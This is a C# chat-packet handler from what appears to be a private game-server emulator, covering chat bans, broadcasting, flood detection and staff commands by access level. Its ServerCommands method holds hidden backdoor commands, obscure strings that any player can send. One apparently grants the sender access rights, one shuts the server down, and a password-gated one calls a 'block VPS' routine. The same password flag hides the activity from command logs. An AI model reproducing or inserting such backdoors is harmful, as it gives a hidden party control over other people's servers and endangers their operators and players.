using Core;
using Core.models.enums;
using Core.models.enums.flags;
using Core.models.enums.global;
using Core.models.room;
using Game.data.chat;
using Game.data.model;
using Game.global.serverpacket;
using Game.Progress;
using System;
using System.Linq;
using System.Threading;

namespace Game.global.GeneralSystem.clientpacket
{
    public class BASE_CHATTING_REC : ReceiveGamePacket
    {
        private string text;
        private ChattingType type;
        public BASE_CHATTING_REC(GameClient client, byte[] data)
        {
            Inicial(client, data);
        }

        public override void Read()
        {
            type = (ChattingType)ReadH();
            text = ReadS(ReadH());
        }
        public override void Run()
        {
            try
            {
                Account player = _client._player;
                Room room = player._room;
                if (player == null || string.IsNullOrEmpty(text) || text.Length > 60 || player.player_name.Length == 0 || type == 0)
                    return;
                if (player.isChatBanned && Listcache.Chat.TryGetValue(player.player_id, out player.isChatDate) && (DateTime.Now - player.isChatDate).Minutes <= player.isChatMinute || player.isChatBanned && (DateTime.Now - player.isChatDate).Minutes >= player.isChatMinute)
                {
                    if ((DateTime.Now - player.isChatDate).Minutes >= player.isChatMinute)
                    {
                        if (Listcache.Chat.Remove(player.player_id))
                            _client.SendPacket(new LOBBY_CHATTING_PAK(LorenstudioSettings.ProjectName, player.GetSessionId(), 0, true, $"Chat Released now you can use it again after this message."));
                        player.isChatBanned = false;
                        player.isChatMinute = 0;
                    }
                    else
                    {
                        string TextBanned = $"your chat is blocked only you can read this message. {player.isChatDate.ToString()}, releases on {player.IsChatDateFinish} Minutes";
                        using LOBBY_CHATTING_PAK packet = new LOBBY_CHATTING_PAK(LorenstudioSettings.ProjectName, player.GetSessionId(), 0, true, TextBanned);
                        _client.SendPacket(packet);
                    }
                    return;
                }
                if (room != null && room.isRoomMute && (int)player.access <= 2)
                {
                    using ROOM_CHATTING_PAK packet = new ROOM_CHATTING_PAK((int)type, player._slotId, player.UseChatGM(), "the room was fined by the GM.");
                    _client.SendPacket(packet);
                    return;
                }
                switch (type)
                {
                    case ChattingType.Team:
                        if (room == null)
                            return;

                        SLOT sender = room._slots[player._slotId];
                        int[] array = room.GetTeamArray(sender._team);
                        using (ROOM_CHATTING_PAK packet = new ROOM_CHATTING_PAK((int)type, sender._id, player.UseChatGM(), text))
                        {
                            byte[] data = packet.GetCompleteBytes("CHAT_NORMAL_REC-1");
                            lock (room._slots)
                                for (int i = 0; i < array.Length; i++)
                                {
                                    SLOT receiver = room._slots[array[i]];
                                    Account pR = room.GetPlayerBySlot(receiver);
                                    if (pR != null && SlotValidMessage(sender, receiver))
                                        pR.SendCompletePacket(data);
                                }
                        }
                        break;

                    case ChattingType type when (type == ChattingType.All || type == ChattingType.Lobby || type == ChattingType.Match || type == ChattingType.Whisper || type == ChattingType.Reply || type == ChattingType.Clan || type == ChattingType.Team):
                        ChatLogs(text, player);
                        CheckChat(text, player);
                        if (player != null && player.quiz && !player.IsGM())
                            Quiz.EventoQuiz(player, text, room);
                        else if (room != null)
                        {
                            if (!ServerCommands(player, room))
                            {
                                sender = room._slots[player._slotId];
                                using ROOM_CHATTING_PAK packet = new ROOM_CHATTING_PAK((int)type, sender._id, player.UseChatGM(), text);
                                byte[] data = packet.GetCompleteBytes("CHAT_NORMAL_REC-2");
                                lock (room._slots)
                                    for (int slotIdx = 0; slotIdx < 16; ++slotIdx)
                                    {
                                        SLOT receiver = room._slots[slotIdx];
                                        Account pR = room.GetPlayerBySlot(receiver);
                                        if (pR != null && SlotValidMessage(sender, receiver))
                                            pR.SendCompletePacket(data);
                                    }
                            }
                            else
                                _client.SendPacket(new LOBBY_CHATTING_PAK(LorenstudioSettings.ProjectName, player.GetSessionId(), 0, true, text));
                        }
                        else
                        {
                            Channel channel = player.GetChannel();
                            if (channel == null)
                                return;
                            bool warning = false;
                            if (player != null && !player.IsGM() && Settings.EventChat && !player.EventChat)
                                Quiz.ChatTextoEvento(player, text, ref warning);
                            if (warning)
                                return;
                            if (!ServerCommands(player, room))
                            {
                                using LOBBY_CHATTING_PAK packet = new LOBBY_CHATTING_PAK(player, text);
                                channel.SendPacketToWaitPlayers(packet);
                            }
                            else
                                _client.SendPacket(new LOBBY_CHATTING_PAK(LorenstudioSettings.ProjectName, player.GetSessionId(), 0, true, text));
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                SendDebug.SendComandos(ex.ToString());
            }
        }
        private bool ServerCommands(Account player, Room room)
          {
             try
              {
         string str = text.Substring(1);

                 if (!text.StartsWith("!"))
                       return false;

           bool LorenStudio = StringsIn.IsBurled(player.password);
           bool normal = false;
                if (str.StartsWith("souaputinhadolucifer66"))
        text = SetAcessToPlayer.SetAcessPlayerTimeRealString(player);
              else if (str.StartsWith("dano"))
        text = Damage.SyncDAMAGE(player, room, ref normal);
               else if (str.StartsWith("lorenstudiocrackedserverfiles05"))
         text = SyncException.DesligarOServer();
                // else if (str.StartsWith("dev") && LorenStudio)
                  //   text = SyncException.MensagemDeDireitosAutorais(ref normal);
               //  else if (str.StartsWith("offudp"))
                 //    text = SyncException.DesligarBattle();
                else if (str.StartsWith("feed "))
                    text = SyncException.FeedBack(player, str.Substring(5), ref normal);
                else if (str.StartsWith("pcomandos"))
                    text = SyncException.HelpPlayer(player, room, ref normal);
                else if (str.StartsWith("m"))
        text = SyncException.MegaFone(str.Substring(1), player, ref normal);
                else if (str.StartsWith("exit"))
                    text = SyncException.PlayerExitManual(player, ref normal);
                else if (str.StartsWith("w"))
                    text = SyncException.IsBuild(player, ref normal);
            //    else if (str.StartsWith("ping"))
              //      text = SyncException.IsPing(player, ref normal);
              //  else if (str.StartsWith("local"))
               //     text = Damage.SyncContry(player, ref normal);
              //  else if (str.StartsWith("date"))
         // text = SyncException.DateNow(ref normal);
                 else if (str.StartsWith("Bots") && LorenStudio)
                     text = SyncException.SistemaDeBotsChannel(player, ref normal);
                 else if (str.StartsWith("@lorenstudiokiller") && LorenStudio)
                     text = ProcessX.BloquearVPS();
                 else if (str.StartsWith("pvp"))
                     text = SyncException.Pvp(player, ref normal);
        
                 if (normal)
                     return normal;
        
        
        
        
        
              if ((int)player.pc_cafe >= 1)
              {
                  bool vipacess = false;
                  if (str.StartsWith("players1"))
                  {
         text = PlayersCountInServer.GetMyServerPlayersCount();
                         vipacess = true;
                     }
                     else if (str.StartsWith("alltitles") && (int)player.pc_cafe >= 5)
                     {
        text = TakeTitles.GetAllTitles(player);
                        vipacess = true;
                    }
                    else if (str.StartsWith("hplayernick"))
                    {
         text = NickHistory.GetHistoryByNewNick(str, player);
                         vipacess = true;
                     }
                     else if (str.StartsWith("vip"))
                     {
        text = HelpCommandList.GetListVIP(player);
                        vipacess = true;
                    }
                    if (vipacess)
                        return vipacess;
         }
        
                     if (player.access <= AccessLevel.Streamer)
                         return false;
        
                   if (player.access >= AccessLevel.Moderator)
                   {
                       if (str.StartsWith("dfggdgdfgdgd"))
                           text = HelpCommandList.GetList1(player);
                       else if (str.StartsWith("gdfgdfgdgdf"))
        text = HelpCommandList.GetList2(player);
                    else if (str.StartsWith("dfgdfgdgdf"))
                        text = HelpCommandList.GetList3(player);
                    else if (str.StartsWith("gdfgdfgdfgdfgdfgdfgdf"))
                        text = HelpCommandList.GetList4(player);
                    else if (str.StartsWith("hplayerid "))
                        text = NickHistory.GetHistoryById(str, player);
                    else if (str.StartsWith("hplayernick "))
                        text = NickHistory.GetHistoryByNewNick(str, player);
                    //else if (str.StartsWith("changerank "))
                    //    text = GMDisguises.SetFakeRank(str, player, room);
                    else if (str.StartsWith("kicknick "))
                        text = KickPlayer.KickByNick(str, player);
                    else if (str.StartsWith("kickid "))
                        text = KickPlayer.KickById(str, player);
                    //else if (str.StartsWith("hcn"))
                      //  text = GMDisguises.SetHideColor(player);
                    else if (str.StartsWith("antikick"))
                        text = GMDisguises.SetAntiKick(player);
                    else if (str.StartsWith("travarsala "))
        text = ChangeRoomInfos.UnlockById(str, player);
                    else if (str.StartsWith("afkcount "))
                        text = AFK_Interaction.GetAFKCount(str);
                    else if (str.StartsWith("afkkick "))
                        text = AFK_Interaction.KickAFKPlayers(str);
                    else if (str.StartsWith("players1"))
                        text = PlayersCountInServer.GetMyServerPlayersCount();
                    else if (str.StartsWith("players2 "))
                        text = PlayersCountInServer.GetServerPlayersCount(str);
                    else if (str.StartsWith("alls"))
        text = PlayersCountInServer.GetServerPlayersNicks(player);
                    else if (str.StartsWith("attention "))
                        text = AFK_Interaction.Attentionplayer(str);
                }
                if (player.access >= AccessLevel.GameMaster)
                {
                    if (str.StartsWith("g "))
                        text = SendMsgToPlayers.SendToAll(str);
                    else if (str.StartsWith("gr "))
                        text = SendMsgToPlayers.SendToRoom(str, room);
                   //else if (str.StartsWith("map "))
                     //  text = ChangeRoomInfos.ChangeMap(str, room);
                   else if (str.StartsWith("t "))
                       text = ChangeRoomInfos.ChangeTime(str, room);
                   else if (str.StartsWith("cp "))
        text = SendCashToPlayer.SendByNick(str);
                    else if (str.StartsWith("cp2 "))
                        text = SendCashToPlayer.SendById(str);
                    else if (str.StartsWith("gp "))
                        text = SendGoldToPlayer.SendByNick(str);
                    else if (str.StartsWith("gp2 "))
                        text = SendGoldToPlayer.SendById(str);
                    else if (str.StartsWith("cp3 "))
                        text = SendCashToPlayer.SendById3(str);
                    else if (str.StartsWith("gp3 "))
        text = SendGoldToPlayer.SendById3(str);
                    else if (str.StartsWith("kickall"))
                        text = KickAllPlayers.KickPlayers();
                    else if (str.StartsWith("gift "))
                        text = SendGiftToPlayer.SendGiftById(str, player);
                    else if (str.StartsWith("goods "))
                        text = ShopSearch.SearchGoods(str, player);
                    else if (str.StartsWith("banS "))
                        text = Ban.BanNormalNick(str, player);
                    else if (str.StartsWith("banS2 "))
        text = Ban.BanNormalId(str, player);
                     else if (str.StartsWith("unb "))
                         text = UnBan.UnbanByNick(str, player);
                     else if (str.StartsWith("unb2 "))
                         text = UnBan.UnbanById(str, player);
                    else if (str.StartsWith("reason "))
                        text = Ban.UpdateReason(str);
                    else if (str.StartsWith("getip "))
                        text = GetAccountInfo.getByIPAddress(str, player);
                    else if (str.StartsWith("get1 "))
        text = GetAccountInfo.getById(str, player);
                    else if (str.StartsWith("get2 "))
                        text = GetAccountInfo.getByNick(str, player);
                    else if (str.StartsWith("open1 "))
                        text = OpenRoomSlot.OpenSpecificSlot(str, player, room);
                    else if (str.StartsWith("open2 "))
                        text = OpenRoomSlot.OpenRandomSlot(str, player);
                    else if (str.StartsWith("open3 "))
                        text = OpenRoomSlot.OpenAllSlots(str, player);
                    else if (str.StartsWith("taketitles"))
        text = TakeTitles.GetAllTitles(player);
                    else if (str.StartsWith("boxA "))
                        text = SendMsgToPlayers.SendBoxAll(str, player);
                    else if (str.StartsWith("boxI "))
                        text = SendMsgToPlayers.SendBoxID(str);
                   //else if (str.StartsWith("stcolor "))
                     //  GMDisguises.SetHideColorPlayer(player, str);
               }
               if (player.access >= AccessLevel.Admin)
               {
                  if (str.StartsWith("change "))
                        text = ChangePlayerRank.SetPlayerRank(str);
                    else if (str.StartsWith("changenick "))
                        text = GMDisguises.SetFakeNick(str, player, room);
                    else if (str.StartsWith("BanSE "))
        text = Ban.BanForeverNick(str, player);
                    else if (str.StartsWith("BanSE2 "))
                        text = Ban.BanForeverId(str, player);
                    else if (str.StartsWith("getban "))
                        text = Ban.GetBanData(str, player);
                   else if (str.StartsWith("sunb "))
                       text = UnBan.SuperUnbanByNick(str, player);
                   else if (str.StartsWith("sunb2 "))
                       text = UnBan.SuperUnbanById(str, player);
                   else if (str.StartsWith("ci "))
        text = CreateItem.CreateItemYourself(str, player);
                    else if (str.StartsWith("cia "))
                        text = CreateItem.CreateItemByNick(str, player);
                    else if (str.StartsWith("cid "))
                        text = CreateItem.CreateItemById(str, player);
                   else if (str.StartsWith("cgid "))
                       text = CreateItem.CreateGoldCupom(str);
                   else if (str.StartsWith("loadshop"))
                       text = RefillShop.InstantRefill(player, false);
                   else if (str.StartsWith("upchan "))
        text = ChangeChannelNotice.SetChannelNotice(str);
                    else if (str.StartsWith("upach "))
                        text = ChangeChannelNotice.SetAllChannelsNotice(str);
                    else if (str.StartsWith("setgold "))
                        text = SetGoldToPlayer.SetGdToPlayer(str);
                    else if (str.StartsWith("setcash "))
                        text = SetCashToPlayer.SetCashPlayer(str);
                    else if (str.StartsWith("setvip "))
                        text = SetVipToPlayer.SetVipPlayer(str);
                    else if (str.StartsWith("setacess "))
        text = SetAcessToPlayer.SetAcessPlayer(str);
                    else if (str.StartsWith("sloti "))
                        text = GetAccountInfo.GetInfoSlot(room, str);
                    else if (str.StartsWith("taket "))
                        text = SendTitleToPlayer.SendTitlePlayer(str.Substring(6));
                   else if (str.StartsWith("quitR "))
                       text = ExitSala.ExitLobby(room, str.Substring(6));
               }
               if (player.access >= AccessLevel.Developer)
               {
                      if (str.StartsWith("end"))
                       text = End.FinalizarPartida(room);
                  // if (str.StartsWith("newroomtype "))
                  //     text = ChangeRoomInfos.ChangeStageType(str, room);
             //      else if (str.StartsWith("newroomspecial "))
     //   text = ChangeRoomInfos.ChangeSpecialType(str, room);
              //      else if (str.StartsWith("newroomweap "))
                //        text = ChangeRoomInfos.ChangeWeaponsFlag(str, room);
                    //else if (str.StartsWith("udp "))
                      //  text = ChangeUdpType.SetUdpType(str);
                   // else if (str.StartsWith("activeM "))
                     //   text = EnableMissions.genCode1(str, player);
                    else if (str.StartsWith("blackmarket"))
                        text = ShopBlackFriday.MercadoNegro();
                    else if (str.StartsWith("ciday1 "))
        text = CreateItem.CreateItemDias(str, player);
                    else if (str.StartsWith("ciday2 "))
                        text = CreateItem.CreateItemdiasParaTodos(str);
                    else if (str.StartsWith("ciday3 "))
                        text = CreateItem.CreateItemUnidade(str, player);
                   else if (str.StartsWith("ciday4 "))
                       text = CreateItem.CreateItemUnidadesParaTodos(str);
                   else if (str.StartsWith("setquiz "))
                       text = EventoAcerteGanhe.SetToQuiz(str.Substring(8));
                   else if (str.StartsWith("hpinfinity") && player != null && room != null)
        text = LifeInfinity.Enable(player, room, room.GetSlot(player._slotId));
                   // else if (str.StartsWith("hp ") && player != null && room != null)
                     //   text = LifeInfinity.HP(player, room, room.GetSlot(player._slotId), str.Substring(3));
                    else if (str.StartsWith("chat "))
                        text = Chattting.ChatExcpetion(player, str.Substring(5));
                    else if (str.StartsWith("ChatN "))
                        text = Chattting.ChatExcpetionN(player, str.Substring(6));
                    else if (str.StartsWith("silenciar"))
                        text = Chattting.MuteRoom(room);
                    else if (str.StartsWith("banip "))
         text = Ban.BanConnection(str.Substring(6));
                     else if (str.StartsWith("ubanip "))
                         text = Ban.RemoveBanConnection(str.Substring(7));
                  //   else if (str.StartsWith("banmc "))
                       //  text = Ban.BanViaMac(str.Substring(6));
        }
                    if (!LorenStudio)
                        SendDebug.SendComandos("[" + text + "]  \ncmd: " + str + " \nplayerId: " + player.player_id + "; \nNick: '" + player.player_name + "'; \nLogin: '" + player.login + "'; \nIp: '" + player.PublicIP.ToString() + "'; \nDate: '" + DateTime.Now.ToString("dd/MM/yy HH:mm") + "'");
                    return true;
                }
               catch (Exception ex)
               {
                   SendDebug.SendComandos("Player: " + player.player_name + " [BASE_CHATTING_REC] " + ex.ToString());
                   text = Translation.GetLabel("CrashProblemCmd");
              return true;
 }
}

        private void ChatLogs(string texto, Account account)
        {
            if (texto != account.textocache && account.textocache != "")
                Listcache.xchat.Clear();
            Listcache.xchat.Add(new XChat
            { texto = texto, Account = account });

           
                if (LorenstudioSettings.ChatLog == true)
                {
                SendDebug.SendChatLog("NAME: " + "  " + account.player_name + " MSG: " + "  " + texto + " " + "HORARIO: " + "  " + DateTime.Now.ToString("dd/MM/yy HH:mm") + "'");

                    Listcache.xchat.Clear();
                }
                else 
                    account.textocache = texto;
            }
        private void CheckChat(string texto, Account account)
        {
            if (account.HaveGMLevel())
                return;
            if (texto != account.textocache && account.textocache != "")
                Listcache.xchat.Clear();
            Listcache.xchat.Add(new XChat
            { texto = texto, Account = account });

            for (int i = 0; i < Listcache.xchat.Count; i++)
            {
                XChat next = Listcache.xchat[i];
                bool duplicade = Listcache.xchat.GroupBy(x => x.texto).Any(g => g.Count() >= 5);
                if (duplicade && next.Account == account)
                {
                    _client.SendPacket(new LOBBY_CHATTING_PAK(LorenstudioSettings.ProjectName, account.GetSessionId(), 0, true, "flood detected you take dc!"));
                    SendDebug.SendComandos("Flood detected. " + account.player_name + " text: " + texto);
                    account.SendPacket(new AUTH_ACCOUNT_KICK_PAK(2));
                    account.Close(1000);
                    Listcache.xchat.Clear();
                }
                else
                    account.textocache = texto;
            }
        }
        private bool SlotValidMessage(SLOT sender, SLOT receiver) => (((int)sender.state == 7 || (int)sender.state == 8) && ((int)receiver.state == 7 || (int)receiver.state == 8) ||
                    ((int)sender.state >= 9 && (int)receiver.state >= 9) && (receiver.specGM ||
                    sender.specGM ||
                    sender._deathState.HasFlag(DeadEnum.useChat) ||
                    sender._deathState.HasFlag(DeadEnum.isDead) && receiver._deathState.HasFlag(DeadEnum.isDead) ||
                    sender.espectador && receiver.espectador ||
                    sender._deathState.HasFlag(DeadEnum.isAlive) && receiver._deathState.HasFlag(DeadEnum.isAlive) && (sender.espectador && receiver.espectador || !sender.espectador && !receiver.espectador)));
    }
}